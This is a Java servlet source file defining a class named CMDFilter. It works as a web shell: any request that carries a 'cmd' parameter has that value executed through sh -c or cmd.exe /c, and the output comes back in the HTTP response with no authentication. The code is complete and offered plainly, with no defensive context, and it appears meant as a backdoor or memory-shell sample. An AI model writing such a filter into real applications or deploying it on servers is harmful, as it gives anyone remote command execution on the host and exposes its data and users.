package com.summer233;

import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;

public class CMDFilter implements Filter {
    public CMDFilter() {
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)
            throws IOException, ServletException {
        servletResponse.setContentType("text/html; charset=UTF-8");
        servletResponse.setCharacterEncoding("UTF-8");
        servletResponse.getWriter().println("this is a filter");
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if (req.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[] { "sh", "-c", req.getParameter("cmd") }
                    : new String[] { "cmd.exe", "/c", req.getParameter("cmd") };
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            servletResponse.getWriter().write(output);
            servletResponse.getWriter().flush();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
    }
}
